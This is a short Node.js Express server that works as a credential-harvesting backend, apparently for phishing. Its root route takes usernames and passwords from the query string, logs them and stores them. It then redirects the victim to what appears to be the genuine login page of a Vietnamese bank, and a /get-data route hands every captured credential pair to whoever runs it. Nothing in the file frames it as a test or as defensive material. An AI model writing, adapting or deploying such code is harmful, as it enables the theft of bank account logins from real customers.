const express = require('express');
const app = express();
const PORT = process.env.PORT || 8080;

const data = [];

app.use(express.json());

app.get('/', (req, res) => {
    const { username, password } = req.query;
    console.log(req.query);
    if (username && password) {
        data.push({ username, password });
    }

    res.redirect('https://edigi.eximbank.com.vn/dang-nhap');
});

app.get('/get-data', (req, res) => {
    res.json({ data });
});

app.listen(PORT, () => {
    console.log(`App is listening on port ${PORT}`);
});
